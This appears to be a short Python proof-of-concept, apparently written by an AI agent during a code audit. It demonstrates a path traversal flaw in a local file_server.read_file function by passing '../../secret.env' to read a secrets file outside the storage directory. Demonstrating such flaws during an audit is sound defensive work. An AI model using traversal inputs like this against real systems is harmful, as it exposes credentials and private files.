<parameter=file_text>"""Proof-of-concept: path traversal in file_server.read_file.

The public function read_file(username, filename) joins BASE_DIR / username / filename
without checking that the resolved path stays under storage/. By passing a filename
containing ".." we escape storage/ and read files_to_audit/secret.env via read_file.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent / "files_to_audit"))

from file_server import read_file

# Legit use works:
print("LEGIT:", read_file("alice", "notes.txt").strip())

# Exploit: traverse up two dirs from storage/alice/ to reach files_to_audit/secret.env
# storage/alice/<file>  ->  ../../secret.env  =>  files_to_audit/secret.env
leaked = read_file("alice", "../../secret.env")
print("LEAKED:", leaked)
